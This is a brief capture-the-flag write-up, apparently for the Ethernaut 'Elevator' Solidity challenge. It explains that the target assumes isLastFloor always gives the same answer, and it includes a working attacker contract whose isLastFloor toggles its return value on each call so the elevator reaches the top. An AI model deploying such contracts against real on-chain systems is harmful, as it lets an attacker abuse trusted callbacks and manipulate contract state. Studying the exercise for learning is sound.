### Analysis
The issue is in the assumption that .isLastFloor is a pure function. That is, the assumption that for any given floor, .isLastFloor will always return the same value.We can take advantage of this assumption by creating an impure function.

### The Exploit
Delopyed the follow contract,call the function of getTop:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface IElevator{
    function goTo(uint _floor) external; 
}

contract Building{
    bool flag = true;

    function isLastFloor(uint _floor) public returns (bool){
        flag = !flag;
        return flag;
    }

    function getTop(uint _floor,address _elevator) public {
        IElevator(_elevator).goTo(_floor);      
    }
}
~~~